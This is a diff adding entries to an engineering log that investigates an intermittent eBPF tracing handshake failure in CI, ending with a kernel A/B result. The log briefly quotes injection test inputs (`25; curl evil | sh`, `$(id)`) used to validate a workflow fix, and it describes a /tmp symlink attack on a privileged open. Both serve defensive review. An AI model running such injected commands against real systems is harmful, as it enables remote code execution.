@@ -1125,3 +1125,804 @@ SILENT-SUBSTITUTION is that a run in which it fires is indistinguishable
 from one in which it does not, so there is nothing to measure until a
 counter exists. The order of work is counter, then forced control, then
 measurement — the order `kernel_pending_insert_failed` went through.
+
+---
+
+## Run 7 — why the 7.0 x86_64 lane cannot establish its traced root
+
+Open. Five hypotheses refuted, no cause yet, and one of my own controls
+was invalid. Recorded because the refutations are the expensive part and
+the next person should not re-pay for them.
+
+Kernels: `6.8.0-136-generic aarch64` (Colima, handshake works) against
+`7.0.0-1017-azure x86_64` (the lane, handshake never observed).
+
+### What the lane reports
+
+`TRACED_PIDS is empty` after the 2s wait, so the capture refuses to
+trace. Before #1313 the same lane failed later, on
+`libsafe/src/lib.rs is in no rustc read set` -- #1185's own symptom. The
+guard is doing its job; the handshake underneath it is not.
+
+### Refuted, each by measurement rather than argument
+
+1. **Attach ordering / a missing program.** `All probes attached` at
+   `03:10:10.604446`, `Spawning traced command` at `.604522` -- 78us
+   earlier, no attach failure.
+2. **Argument offsets.** `tracepoint-inventory.sh` run on x86_64 for the
+   first time (the gap this document listed as outstanding):
+   `dfd`@16, `filename`@24, `flags`@32, `ret`@16, identical to arm64 and
+   to what `open_syscalls.rs` hardcodes. All nine open-family
+   tracepoints PRESENT. Control held -- `rename` reads PRESENT here and
+   ABSENT on arm64, so the probe read this kernel.
+3. **A NULL filename.** 7.0 *does* add
+   `__data_loc char[] __filename_val` @48 to `sys_enter_openat`, absent
+   on 6.8, so the tracepoint now copies the filename into the record.
+   Passing a valid empty-string pointer changed nothing. The kernel
+   difference is real; the inference from it was wrong.
+4. **A zero-extended `dfd`.** `low32_only=0`: no open arrived with the
+   sentinel's low 32 bits and a differing upper 32.
+5. **`dfd` validated before the tracepoint fires.** Both markers issued
+   from one `pre_exec` -- the invalid-`dfd` original and a
+   nonce-in-`flags` variant with a valid `AT_FDCWD`. Both unobserved
+   (`sentinel_dfd_seen=0`, `nonce_in_flags=0`), so rejecting the call
+   early is not it either.
+
+### Established
+
+- `sys_enter_openat` fires on this kernel: 466, 99, 45, 20, 18 openats
+  across runs.
+- The nonce is armed and reads back intact after the failure.
+- Seeding is never attempted: `recognised=0`, `traced_insert_failed=0`.
+- `pre_exec` **does** run, proven without eBPF -- the closure creates
+  `/tmp/wb-pre-exec-ran` by raw syscall and userspace stats it:
+  `pre_exec_ran=yes`. So the marker syscalls execute.
+- And they are not observed. That is the whole remaining question.
+
+### The invalid control, named
+
+Slot 7 counted "opens from a pid that is not the tracer" via
+`should_trace()`, intending to test whether the probe sees any process
+but itself. It reported `non_tracer_opens == openat_entered` exactly
+(18 of 18, 20 of 20), which looks like a clean answer and is not one:
+`should_trace` compares `cfg.tracer_pid` to `current_pid()`, and the
+tracer's pid is the namespaced one while the kernel's is the
+init-namespace one. They cannot match in a container. **This is the
+mismatch the handshake exists to work around**, documented in
+`cli/scan.rs` as "what silently disabled the tracer-exclusion filter in
+every containerised run" -- and the control was built on top of it. It
+measures a tautology, so the unifying hypothesis below is untested, not
+supported.
+
+### The hypothesis worth testing next
+
+The x86_64 capture has been short since before #1313: 29 file operations
+against 102 on arm64, not one `.rs` read in the recorded list, every
+instrumented site denying it. If the probe does not observe the traced
+child's syscalls at all, that is the handshake failure and the missing
+read sets as **one** fault.
+
+Test it by amplitude, not by identity, since identity is what the
+invalid control got wrong: have `pre_exec` issue N identical openats and
+read `openat_entered`. Baseline is 18-20. If issuing 50 leaves it at
+18-20 the child's opens are invisible; if it reaches ~68 they are seen
+and only the markers are not, which nothing yet explains.
+
+### What is already worth keeping, cause or no cause
+
+- The failure now describes itself. Aborting before the attestation left
+  every drop counter unreadable, `kernel_traced_insert_failed` included
+  -- the one covering the seeding path. Two rounds were spent on that
+  before the diagnosis moved into the error.
+- `HANDSHAKE_DIAG` is deliberately not slots in `EVENT_DROPS`: that map
+  now feeds `measured_loss`, so a diagnostic counted there would be
+  reported as lost capture.
+- The eBPF lane did not watch `waybill-cli/src/cli/scan.rs` or
+  `waybill-common/src/{maps,events,filter,ip}.rs`. It could skip inside
+  a run reporting success while the trace orchestration and the
+  kernel/userspace ABI changed under it.
+- `open_syscalls.rs` claimed its offsets were "measured against every
+  tracepoint this module attaches to". True of arm64 only until run 7.
+
+## Run 12 — the x86_64 handshake is intermittent, not absent
+
+Found while reconciling #1322 against the tree, by reading `main`'s own
+eBPF lane logs rather than the probe branch's. It contradicts two things
+run 7 and #1322 both asserted.
+
+### What the lane actually did
+
+`main` at `9880eb77`, run `41161815084`, container harness, kernel
+`7.0.0-1017-azure` x86_64. Three traces across two harness attempts:
+
+| # | trace | result |
+|---|---|---|
+| 1 | `#1185 control` (attempt 1) | **root established** — attestation emitted, `event_drop_reasons {"kernel_outside_traced_subtree":21}`, `file operations 4`, `unresolved_relative 0` |
+| 2 | `#1185 scope` (attempt 1) | failed: `TRACED_PIDS is empty` |
+| 3 | `#1185 control` (attempt 2) | failed: `TRACED_PIDS is empty` |
+
+One of three established its traced root. The first and third are the
+*same probe with the same command*, 16 seconds apart in the same
+container, and they disagree.
+
+### Two claims this refutes, both mine
+
+**"The traced root never announces itself on x86_64."** It announced
+itself in trace 1. Run 7 generalised "never" from runs that all failed,
+and that set did not include a success it could have. The honest
+statement is **intermittent**, with N=3 in one run — which is not enough
+to characterise a rate, only enough to kill "never".
+
+**"#1313 traded a wrong x86_64 capture for no x86_64 capture."**
+Unsupported. The harness order changed: the `#1185` control and scope
+probes now run *before* the m210 fixture trace, and the scope probe's
+abort ends the harness, so **the m210 trace is never reached**. At
+`2f9be2e6` the m210 trace ran, emitted an attestation and captured 7
+rustc invocations, failing later on `m1070 SC-001`
+(`libsafe/src/lib.rs is in no rustc read set`). Post-#1313 there is no
+evidence either way about m210 capture on x86_64, because nothing runs
+it. "No capture" described the harness aborting early, not the capture
+failing.
+
+### What this does to the next test
+
+The amplitude test recorded in run 7 — issue N identical openats from
+`pre_exec` and watch `openat_entered` move — was designed for a probe
+that never sees the child. For a handshake that works one time in three
+it answers the wrong question: a null result would be indistinguishable
+from having drawn two failures.
+
+The question is now **what differs between a trace that establishes its
+root and one that does not**, and the first candidate is timing, because
+the bail is a 2s timeout. Two things to measure, in order:
+
+1. **Rate, before mechanism.** Run the control probe N≥20 times in one
+   container and count establishments. Without a rate, any fix is
+   unfalsifiable: a change that does nothing passes two runs out of
+   three.
+2. **What the clock says.** The log already carries `All probes
+   attached` → `Spawning traced command` → `Child started`, and in trace
+   1 that span was 2.4ms. Instrument the nonce write and the first
+   `is_handshake` call against the same clock and compare an
+   establishing trace with a failing one.
+
+Note the uprobe attach in this run took **2.47s** (`Attaching uprobes to
+libssl` 03:10:08.131 → `All probes attached` 03:10:10.604), against a
+2s handshake timeout. That is not yet a cause — attach completes before
+the child is spawned, so ordering is not violated — but it is the only
+measured quantity in the trace that is the same order of magnitude as
+the timeout, and it is the first thing to rule in or out.
+
+### Why this is in the list
+
+#1322 records ten measurements that read as results and were not. This
+is the eleventh, and it is the same shape as the slot-7 control: a
+property asserted from a sample that could not establish it. "Never"
+needed one counter-example and the counter-example was sitting in
+`main`'s own CI log the whole time, unread, because the diagnosis was
+being run on the probe branch.
+
+## The twelfth: the `pre_exec_ran` marker could not have answered its question
+
+Removed before landing, not after. The diagnostic wrote
+`/tmp/wb-pre-exec-ran` from the child's `pre_exec` and stat'd it from the
+tracer, to separate "the closure did not run" from "the probe did not see
+it". Three defects, and the first alone is disqualifying:
+
+**It is sticky-positive and never removed.** The harness runs three
+traces per attempt. Once any one of them creates the file, every later
+trace in that container reads `pre_exec_ran=yes` whether its own closure
+ran or not. Run 12's table is exactly that shape — trace 1 established
+its root, traces 2 and 3 did not — so in the single run this instrument
+was built to explain, two of its three readings were the first trace's
+answer repeated. It is the same failure the slot-7 control had, and the
+same failure this whole document catalogues: a value that reads as a
+measurement and is a leftover.
+
+**It is a root-owned open of a predictable path in a world-writable
+directory.** Tracing needs privileges, so the opener is typically root,
+and `O_CREAT | O_WRONLY` follows symlinks: a pre-planted
+`/tmp/wb-pre-exec-ran -> <anything>` is opened for writing by that root
+process. Nothing is written through the handle, so the blast radius is
+small, but a privileged process opening an attacker-chosen path is not a
+shape to ship, and it also lets anyone on the host set the diagnostic's
+answer.
+
+**It is an unconditional side-effect of every trace.** `handshake_nonce`
+is `Some` for every command-execute trace, with no probe flag gating it,
+so a released binary would touch `/tmp` on every `waybill trace`.
+
+The question it asked is still a good one, and `HANDSHAKE_DIAG` cannot
+answer it: every slot in that map is written by a BPF program, so a
+kernel that never raises the tracepoint and a child whose closure never
+ran both read as zero. **The instrument for it is a `pipe2(O_CLOEXEC)`
+opened before the spawn**: `write()` of one byte in the closure is
+async-signal-safe and allocation-free, the parent's non-blocking read
+answers "did it run", the child's end closes at `exec`, and the whole
+thing is per-trace by construction — no path, no privilege, no staleness,
+nothing to clean up. It is not built here because it cannot be compiled
+in the configuration where it runs from this host, and shipping untested
+`unsafe` fd plumbing to answer a diagnostic question is how this branch
+got its `#[cfg]` defect in the first place.
+
+## Run 13 — the diagnostic's first real output, and what it eliminates
+
+PR #1321, run `41335262367`, `Lint + test (linux-x86_64, --features
+ebpf-tracing)`, kernel `7.0.0-1017-azure`. Two traces, both failed to
+establish, and `describe_handshake_failure` printed for each:
+
+| slot | trace A | trace B |
+|---|---|---|
+| `openat_entered` | **135** | **79** |
+| `sentinel_dfd_seen` | 0 | 0 |
+| `nonce_in_flags` | **0** | **0** |
+| `nonce_rejected` | 0 | 0 |
+| `recognised` | 0 | 0 |
+| `low32_only` | 0 | 0 |
+| `odd_negative_dfd` | 0 | 0 |
+| `traced_insert_failed` | 0 | 0 |
+| `nonce_readback` | 1974713396 | 1355945307 |
+
+### What is now established
+
+**The entry program runs.** 135 and 79 openats reached it. "The
+tracepoint does not fire on this kernel" is dead.
+
+**The nonce is armed and readable.** Both read-backs are non-zero,
+differ per trace, and sit inside `[0x40000000, 0x7FFFFFFF]` — the range
+the loader's forced bit 30 produces. Neither the arming nor the
+userspace read is the break.
+
+**Neither marker arrived.** This is the finding. The branch issues two:
+the original with an invalid `dfd` and the nonce in `flags`, and the new
+one with `AT_FDCWD` and the nonce in `flags`. `sentinel_dfd_seen` and
+`nonce_in_flags` are both zero. The two differ in `dfd` *and* the second
+depends on neither the kernel accepting the call nor on how `dfd`
+arrives — so **no encoding of either can explain both being absent**.
+
+That eliminates, in one run, every hypothesis this branch was built on:
+the NULL filename, the 7.0 `__filename_val` field, `dfd` validation
+ordering, and `dfd` arriving zero-extended (`low32_only` = 0,
+`odd_negative_dfd` = 0 — no negative `dfd` other than `AT_FDCWD`
+appeared at all). The question is no longer how the marker is encoded.
+It is why the child's pre-exec openats are not observed while 135 other
+opens are.
+
+### What it does NOT establish
+
+A rate. These are two draws from a distribution run 12 measured at
+roughly one establishment in three, and both are failures — which is the
+outcome run 12 predicted would be indistinguishable from a real
+negative. **Run 12's ordering stands: rate before mechanism.** Two more
+failures with sharper counters is not the N≥20 that would make any of
+this falsifiable.
+
+### One correction to the instrument, from its own first run
+
+The reading chain fell through to "no open carried the sentinel `dfd`:
+either the marker syscall never reached this tracepoint, or the `dfd`
+does not arrive as written" — offering two possibilities when
+`nonce_in_flags=0`, printed on the same line, had already eliminated the
+second. The instrument had the data to narrow and did not use it. Fixed:
+`sentinel == 0 && nonce_in_flags == 0 && entered != 0` is now its own
+branch and says that no encoding can explain it.
+
+`non_tracer_opens` equals `openat_entered` in both traces and means less
+than it appears to: `should_trace()` is false only for the tracer's own
+pid, and the marker is issued by the forked child, whose pid differs —
+so the child's opens are counted as "non-tracer" too. The slot is
+labelled `[invalid-control]` in the output for that reason and should be
+read as "the tracer process itself did no openat in the window", which
+is unremarkable. Recorded because the equality is suggestive and wrong.
+
+## The instrument for run 14, built before the run
+
+Runs 12 and 13 both ended at the same place: *rate before mechanism*. The
+reason is not methodological tidiness. At roughly one establishment in
+three, a change that does nothing passes two runs out of three, so every
+experiment on this handshake — including run 13's, which drew two
+failures — is unfalsifiable until the denominator exists.
+
+`scripts/ebpf-handshake-rate.sh` plus
+`.github/workflows/handshake-rate.yml` is that denominator.
+
+**Why it cannot be gathered by pushing N times.** Every push is a fresh
+runner with its own image and its own timing, so N pushes measure N
+environments once each. Run 12's own counter-example came from two traces
+*in one container* disagreeing 16 seconds apart. The rate has to come
+from one container, which is why this is a loop inside the harness image
+rather than a trigger.
+
+**What one run reports.** For N iterations (default 25):
+
+- establishments, as a count and a percentage. A zero exit from `trace
+  capture` *is* an establishment, because the fail-closed guard returns
+  non-zero when `TRACED_PIDS` is empty — so the count needs no log
+  parsing to be trustworthy.
+- the per-iteration duration in milliseconds, split by outcome. Run 12
+  named timing as the first candidate cause and recorded a 2.47s uprobe
+  attach against a 2s handshake timeout: the only measured quantity in
+  that trace of the same order as the bail. Establishment-versus-duration
+  falls out of the same loop for free, so measurement 2 in run 12's list
+  arrives with measurement 1 rather than after it.
+- the failure diagnoses grouped by counter shape, with `nonce_readback`
+  normalised out since it varies per trace by construction. Grouped
+  rather than listed because 25 near-identical lines hide whether they
+  are in fact identical, and a *second* shape appearing is more
+  informative than any single line.
+
+**It asserts no threshold and exits 0 whatever it finds.** No rate has
+been measured, so there is nothing to assert against (CLAUDE.md, "measure
+external behaviour before designing around it"), and a zero rate is a
+result rather than a probe failure. Making a low rate an error would mean
+the only runs that report are the ones that already worked.
+
+What it *does* assert is its own denominator: it prints
+`handshake-rate: iterations=N attempted=N established=k` and fails if
+`attempted != N`, because a loop that exited early and a loop that ran to
+completion with zero establishments otherwise print the same zeroes. The
+workflow greps for that line and for the rate line, so a job that built
+an image and never looped cannot pass.
+
+**Triggered by `probe/**` pushes narrowed to four paths, and
+deliberately not the image's `ENTRYPOINT`.** The probe is invoked by
+overriding the entrypoint, so the eBPF CI lane that depends on this image
+cannot be altered by adding a measurement to it.
+
+The trigger took a correction. It was written `workflow_dispatch`-only,
+because the job rebuilds the image (~10 minutes) before running N
+privileged traces and has no business on a broad push trigger. That made
+it **unrunnable**: GitHub registers a workflow for dispatch only from the
+default branch, so a dispatch-only file on a feature branch does not
+appear in `/actions/workflows` at all — checked there, which listed
+`tracepoint-inventory.yml` and not this file. An instrument that cannot
+be invoked until it merges is not an instrument, and it is why
+`tracepoint-inventory.yml` is push-triggered too. The `paths` filter
+keeps the cost where it belongs: the probe, the runner script, the
+workflow and the Dockerfile, all of which change deliberately and
+rarely.
+
+The same check caught a second defect in the same place: `inputs.*` is
+empty on a `push` event, so the deadline would have expanded to
+`timeout "" docker wait` and failed. The defaults now live in the
+expression (`${{ inputs.deadline_seconds || '600' }}`) rather than only
+in the dispatch form, where they are unreachable from a push.
+
+### Two incidental corrections, from building it
+
+`Dockerfile.ebpf-test` claimed `.dockerignore` excludes `scripts/` from
+its bulk `COPY . .`, so that editing an assertion script would not
+invalidate the ~10-minute cargo-build layer. `scripts/` has never been in
+`.dockerignore`, so the optimisation never happened. Not "fixed":
+`.dockerignore` filters the build *context*, so excluding `scripts/`
+would make the explicit `COPY scripts/...` lines fail outright, and a
+negation exception puts the files back in the context where the bulk COPY
+picks them up again. Making the claim true needs the bulk COPY to name
+its paths or use BuildKit's `COPY --exclude`, which is a change to a
+cached 10-minute build that no measurement here calls for. The comment
+now describes what happens.
+
+`scripts/ebpf-container-run.sh` gained an optional entrypoint argument
+rather than a second copy of its deadline-and-diagnostics logic. Its
+empty-array expansion is written `${a[@]+"${a[@]}"}` because under
+`set -u` the bare form is an unbound-variable error before bash 4.4 and
+the script is reachable from a macOS host whose `/bin/bash` is 3.2 —
+measured both ways, not assumed.
+
+### A third correction to the instrument, this one from a reviewer
+
+Kusari Inspector failed PR #1321 on the rate workflow and was right.
+The step interpolated `${{ inputs.deadline_seconds }}`,
+`${{ inputs.iterations }}` and `${{ github.ref }}` straight into `run:`
+shell blocks — a template-injection path in a job that **builds and runs
+a privileged container**, so an injected command would execute with that
+container's reach. Dispatch requires write access, which bounds the
+exposure, and does not make it acceptable: the repository already routes
+values through `env:` for exactly this reason at `ci.yml:804-808` and in
+the m896 canary, and this workflow simply did not follow a pattern that
+was already written down two files away.
+
+Fixed by passing them through `env:` and referencing them quoted, plus
+validation, since the values are not merely untrusted strings but a
+`timeout` argument and a loop bound: non-numeric input would fail
+obscurely inside the probe and an unbounded one would hold a runner
+indefinitely. Both bounds are reasoned rather than guessed — 500 traces
+at ~10s each already exceeds any deadline the job accepts. Checked
+against nine cases including `25; curl evil | sh`, `$(id)`, empty, zero,
+negative and leading whitespace; all rejected, the defaults accepted.
+
+Inspector also named a hardening gap in `tracepoint-inventory.yml`, the
+other workflow this branch adds: its checkout left credentials in the
+local git config. A probe needs none, so `persist-credentials: false`.
+
+Worth recording for what it says about the review loop rather than the
+defect. Three of this instrument's four defects were found by asking a
+question other than "does it look right": *can it be invoked* found two,
+and an external analyser found this one. Reading the file again found
+none of them.
+
+## Run 14 — the rate, and what it does to the timing candidate
+
+PR #1321, workflow `handshake establishment rate (x86_64)`, run
+`41345243372`, commit `7a45f9f1`, kernel 7.0 x86_64. 25 traces of
+`trace capture -- cat /etc/hostname` in **one** container.
+
+```
+handshake-rate: iterations=25 attempted=25 established=9
+handshake-rate: 9/25 established = 36.0%
+```
+
+**The denominator exists.** 36% against run 12's one-in-three from N=3.
+Mechanisms are falsifiable from here: a fix has to move 36% by more than
+the spread of a 25-trace sample, and the two-of-three pass that run 12
+warned about is no longer available to a change that does nothing.
+
+### The duration split, and why it is not the cause
+
+```
+established: min=3289ms median=3311ms max=3351ms n=9
+failed:      min=3307ms median=5272ms max=5359ms n=16
+```
+
+Establishments are extraordinarily tight — a 62ms spread across nine
+traces. Failures sit about 1961ms above them at the median, and **1961ms
+is the 2s handshake timeout**. A failing trace does the same ~3.3s of
+work as a succeeding one and then spends the bail.
+
+So the duration difference is a *consequence* of failure, not evidence of
+a cause, and run 12's timing candidate is weaker than when it was
+proposed: the 2.47s uprobe attach it flagged against a 2s timeout would
+have to show up as a difference in the non-waiting work, and there is
+none — 3289..3351ms whether the handshake lands or not. Recorded as a
+candidate ruled *down*, not out: the attach happens before the child
+spawns in both cases, so this measurement cannot see a race inside it.
+
+This is the second measurement from run 12's list, answered alongside the
+first, and it answered in the unwelcome direction. Worth stating plainly,
+because the attractive reading of a 2s gap is that it is the 2s attach.
+
+### Three failure shapes, which is the informative part
+
+Grouped, 15 diagnosed failures:
+
+| shape | n | what it says |
+|---|---|---|
+| `NEITHER marker arrived`, `openat_entered` non-zero | 14 | run 13's finding, reproduced 14 times |
+| `openat_entered=0` — "`sys_enter_openat` did not fire at all" | 1 | the entry program never ran in that trace |
+| no diagnosis line emitted at all, and it failed in **3307ms** | 1 | iteration 5: a failure that did not consume the timeout |
+
+The last two are new. Iteration 5 failed in establishment-like time with
+no diagnosis, so it did not reach the handshake wait — a different
+failure path from the other fifteen, and one the diagnostic does not
+describe. Iteration 21 saw *zero* machine-wide opens.
+
+### The new lead: `openat_entered` spans 0 to 378
+
+Across the 15 diagnosed failures:
+
+```
+    seen      0 open(s): 1 trace     seen     35 open(s): 1 trace
+    seen      3 open(s): 1 trace     seen     36 open(s): 1 trace
+    seen     11 open(s): 1 trace     seen     38 open(s): 1 trace
+    seen     17 open(s): 1 trace     seen    114 open(s): 1 trace
+    seen     18 open(s): 2 traces    seen    377 open(s): 1 trace
+    seen     30 open(s): 1 trace     seen    378 open(s): 1 trace
+    seen     33 open(s): 2 traces
+```
+
+This counter is incremented **ungated, as the entry program's first
+statement, for every `openat` on the machine**. A trace that observed 3
+opens — or 0 — during a ~3.3s window on a CI runner did not observe a
+quiet machine; it observed almost none of one that cannot have been that
+quiet. A 100× spread across otherwise identical traces says the program's
+*live window* varies, not that the marker is encoded wrongly.
+
+That is a different class of hypothesis from everything tried on this
+branch, and it fits the intermittency naturally: a race between the
+attach becoming effective and the child's pre-exec openats, which are
+issued microseconds after `spawn()`. It also fits run 13's finding rather
+than competing with it — if the program is not yet live, neither marker
+can arrive, whatever either is encoded as.
+
+**Alternatives not excluded**, because this is one run's inference and
+the counter is read once at the end: a partial per-CPU read, a counter
+lost to the same mechanism under investigation, or the read racing
+detachment. The next instrument should timestamp the first
+`increment_handshake_diag` against the nonce write and the spawn, which
+is run 12's measurement 2 asked properly — of the *program's* clock
+rather than the trace's.
+
+### Two defects in the instrument, from its own first run
+
+Both in the grouping, and both the same class as the thing it was built
+to avoid.
+
+**It grouped nothing.** 13 groups for 15 failures, because
+`openat_entered` and `non_tracer_opens` vary per trace by construction
+and were left in the grouping key — so every failure became its own
+group, which is exactly the "25 near-identical lines hide whether they
+are identical" problem the grouping exists to solve. Their spread is a
+finding, as above; their presence in a key is noise. Normalised, and
+reported separately.
+
+**Every count was exactly 2×.** The diagnosis is emitted twice per
+failure, once as the ERROR log and once inside the `Error:` message, and
+the grouping counted matches rather than files. 4+4+2×11 = 30 for 15
+diagnosed failures. One line per log file now.
+
+Neither changes a number above — the rate, the durations and the shapes
+were all recoverable from the per-iteration lines — but a reader who
+trusted the distribution block would have concluded the failures were all
+distinct, which is the opposite of what they are.
+
+## Run 15 — the rate is stable, and the 2s gap is definitively the timeout
+
+Run `41346561754`, commit `ba929b96`, same workflow, same N, a different
+runner. Fired automatically by the push that changed the probe, which is
+what the `paths` filter is for.
+
+```
+handshake-rate: iterations=25 attempted=25 established=8
+handshake-rate: 8/25 established = 32.0%
+```
+
+**32% against run 14's 36%.** Nine establishments then eight, out of 25
+each. **Combined: 17/50 = 34%.** Two samples is not a confidence
+interval, but the denominator is stable enough to measure a fix against,
+which is the property that was missing.
+
+### The gap is the timeout, and now there is a control for it
+
+```
+run 14   established median=3311ms   failed median=5272ms   gap=1961ms
+run 15   established median=2753ms   failed median=4733ms   gap=1980ms
+```
+
+The absolute durations moved by ~550ms between the two runners — a 17%
+difference in machine speed — while **the gap moved by 19ms**, staying
+within 2% of the 2s handshake timeout. A property that survives a change
+in the thing it would depend on if it were machine-related is no longer
+an inference. Run 14 read the gap as the timeout; run 15 supplies the
+control that makes it a measurement.
+
+Which settles run 12's timing candidate as far as this instrument can:
+failing traces do the same work as succeeding ones and then spend the
+bail. The 2.47s uprobe attach is not visible here in either direction.
+
+### The prediction, and what it was tested against
+
+Stated before the run, so it could fail: the rate lands near 36%, and the
+fixed grouping collapses to two or three rows instead of thirteen.
+
+Both held. 32%, and:
+
+```
+     15 #1185 handshake diagnosis -- openat_entered=<varies> ... NEITHER marker arrived
+      2 #1185 handshake diagnosis -- openat_entered=<varies> ... slot 0 is zero
+```
+
+Two rows for 17 failures, counts no longer doubled. The two `slot 0`
+failures are the two traces that saw **zero** machine-wide opens.
+
+### The lead reproduces, harder
+
+`openat_entered` across the 17 failures:
+
+```
+    0, 0, 1, 4, 11, 14, 14, 16, 18, 20, 20, 30, 30, 34, 99, 189, 218
+```
+
+Two traces at zero and one at **one**. A single machine-wide `openat`
+observed across a 2.75s window on a CI runner is not a quiet machine; it
+is a program that was live for a sliver of its own trace. Run 14 spanned
+0..378 and run 15 spans 0..218, both with the mass down at the low end
+and a few outliers two orders of magnitude above. The live-window
+hypothesis survives a second sample.
+
+### A third instrument defect: a fallback that stated something false
+
+Both summary blocks printed their empty-case message *underneath their
+own output*:
+
+```
+     15 #1185 handshake diagnosis -- ...
+      2 #1185 handshake diagnosis -- ...
+    (none — every iteration established)
+```
+
+…beneath a list of seventeen failures, in a run where eight of 25
+established. The cause is `set -o pipefail` plus the inner
+`grep -o … | head -1`, which exits 1 for the one log with no diagnosis
+line and makes the whole pipeline non-zero — so `pipeline || echo` fires
+on a pipeline that produced perfectly good output.
+
+Fixed by capturing the output and testing *it* for emptiness. The general
+shape is worth keeping: **a fallback keyed on exit status can contradict
+the data beside it; one keyed on empty output cannot.** This is the same
+family as the `pre_exec_ran` marker removed earlier — a diagnostic whose
+answer came from somewhere other than the thing it claimed to describe —
+and it is the third defect this instrument has had found by running it
+rather than by reading it.
+
+## Run 16 — the eBPF lane has had THREE failure regimes, and the boundary is a runner image
+
+Prompted by "still seeing failures on the eBPF side", which is true and
+which the rate explains — but checking it against `main`'s own history
+contradicted the framing this whole investigation has carried.
+
+The eBPF lane's outcome on the last 25 CI runs on `main`, with the
+GitHub runner image each ran on:
+
+| date | outcome | runner image |
+|---|---|---|
+| 10-25 → 10-27 | **success ×9** | `20261012.334.1` |
+| 10-28 | success ×1, **failure ×5** | `20261025.353.1` (the 10-28 success too) |
+| 10-28 (one earlier run) | success | `20261021.278.1` |
+| 10-29 → 11-01 | **failure ×10** | `20261025.353.1` |
+
+Ten of ten green on the old images. One of eleven green on the new one.
+
+### Why this is not one regression but three regimes
+
+The obvious reading — the image rollover broke the handshake — is wrong
+about the dates, and the check that catches it is cheap: **the #1185
+control probe, the scope probe and `wait_for_traced_root` all landed
+together in `9880eb77` (#1313) on 2026-10-30.** The lane began failing on
+**10-28**, two days before any of them existed. So the early failures
+cannot be handshake failures.
+
+Reading one: `07982870`, 10-29:
+
+```
+WARN could not attach do_filp_open kprobe: `perf_event_open` failed
+     m213 SC-001: rustc invocations captured via compiler_pipeline = 7
+```
+
+That is **#1252**, not #1185 — the kprobe attach failure, with the m210
+trace still running and still capturing. So:
+
+1. **≤ 10-27** — green, on runner images `20261012.334.1` and
+   `20261021.278.1`.
+2. **10-28 → 10-29** — red from #1252's `do_filp_open` kprobe, on image
+   `20261025.353.1`.
+3. **10-30 onward** — red from the #1185 handshake, because #1313's
+   fail-closed guard aborts the harness *before* the m210 trace is
+   reached. The kprobe problem is presumably still present and no longer
+   the thing that reports.
+
+The common factor across regimes 2 and 3 is the image, not the code.
+
+### Two claims this corrects
+
+**"x86_64 cannot establish its traced root" is the wrong statement.** The
+architecture did not change on 2026-10-28; the runner image did. The
+honest form is: *the runner image that arrived around 10-28 establishes
+the traced root about a third of the time, where its predecessors did so
+reliably enough for ten consecutive green runs.* Every encoding
+hypothesis this branch chased — the NULL filename, `dfd` validation
+order, the 7.0 `__filename_val` field — was a search for an architecture
+difference when the variable was an image change. Run 13 had already
+shown encoding was not the mechanism; this says why the search was aimed
+there.
+
+**The #1252 onset date in this repository's notes is a week early.** They
+record it failing "on every main run since 2026-10-21". The lane was
+green on 10-25, 10-26 and 10-27. The onset is 10-28, and it coincides
+with the image rollover rather than with any commit. #1252's own
+description is recorded as having got its onset date wrong once already,
+"because the evidence had scrolled away" — this is the same error
+repeated, and the fix is the table above, built from the API rather than
+from recollection.
+
+### The gap that made this hard, and the one-line fix
+
+**The eBPF CI lane never prints its kernel.** Image version is
+recoverable from the Actions log, but the kernel — the thing that
+actually changed under the probes — is not, for any historical run. So
+the old image's kernel is **unmeasured and now unmeasurable**: there is
+no log that recorded it. The failing runs report `7.0.0-1017-azure`,
+from the handshake-rate workflow, which records kernel identity as its
+first step precisely because the kernel is the independent variable.
+
+A `uname -a` step in the lane closes this for the next rollover, which is
+the one durable thing to take from this run.
+
+### What it does to the next measurement
+
+The live-window hypothesis from runs 14 and 15 stands — `openat_entered`
+spanning 0..378 and 0..218 is unaffected by any of this. But it acquires
+a sharper form: whatever the new image changed, it changed *when the
+entry program becomes live relative to a freshly forked child*, and a
+kernel bump is a plausible source for exactly that. Timestamping the
+program's own clock remains the next instrument; this run says to
+timestamp the attach too, and to compare against an older image if one
+can still be requested.
+
+## Run 18 — the kernel is the variable, and 6.8 establishes 25 out of 25
+
+Run 16 ended by saying to "compare against an older image if one can
+still be requested". It can. `ubuntu-22.04` is still a live label, and
+because the container shares the host kernel, the label is the only
+lever this instrument has over the kernel the handshake races against —
+a hosted runner's image version cannot be pinned.
+
+Both arms ran as one matrix off commit `3d8504b0`, started within 20
+seconds of each other, each building its own image from the same tree.
+That matters: runs 14/15/17 measured `ubuntu-latest` on a different day
+against a different image, so they are a weak control for a new reading.
+
+| arm | release | kernel | runner image | rate |
+|---|---|---|---|---|
+| `ubuntu-latest` | 24.04.5 | `7.0.0-1017-azure` | `20261026.354.1` | **8/25 = 32.0%** |
+| `ubuntu-22.04` | 22.04.5 | `6.8.0-1070-azure` | `20261026.341.1` | **25/25 = 100.0%** |
+
+### This is not a shifted probability, it is a different outcome
+
+Twenty-five consecutive establishments. At the control arm's own
+measured 32%, a clean sweep of 25 has probability `0.32^25`, about
+1.3e-12. The instrument is the same script, the same container, the
+same command, in the same hour.
+
+The control also reproduces: 32.0% here against 36%, 32% and 40% in
+runs 14, 15 and 17. `ubuntu-latest` now stands at 35/100 = 35% across
+four runs on two images. A control that reproduces is what licenses
+reading the experimental arm at all.
+
+### The 22.04 arm's shape, which is the stronger evidence
+
+The rate is the headline, but the distribution is the finding:
+
+```
+ubuntu-22.04    established: min=2302ms median=2318ms max=2414ms n=25
+ubuntu-latest   established: min=3351ms median=3368ms max=3405ms n=8
+                failed:      min=5301ms median=5327ms max=5361ms n=17
+```
+
+Three things fall out.
+
+**No diagnosis was emitted at all** — not a quiet failure, not a
+degraded establishment. `(none — no iteration emitted a diagnosis)`,
+which is also the first time the run-15 fallback fix has been exercised
+by a genuinely empty set rather than by a reviewer's mutation.
+
+**The 2s gap holds a fourth time.** 5327 − 3368 = 1959ms, against 1961,
+1980 and 1987 in runs 14, 15 and 17 — within 28ms across four runs and
+four runners while absolute durations moved by a second. The gap is the
+timeout; that is now beyond argument.
+
+**6.8 is a second faster, not merely luckier.** Its established median
+is 2318ms against 24.04's 3368ms, and its spread across 25 traces is
+112ms against 24.04's 54ms across 8. A race that is lost a third of the
+time on one kernel is not being won slowly on the other; it is not
+being run.
+
+### What this settles, and what it does not
+
+Settled: **the traced-root handshake is not an x86_64 property.** It is
+a property of the kernel the probes attach to. Every encoding
+hypothesis this branch chased was looking for an architecture
+difference that was never there, and #1321's title already says so —
+this supplies the A/B that was missing behind it.
+
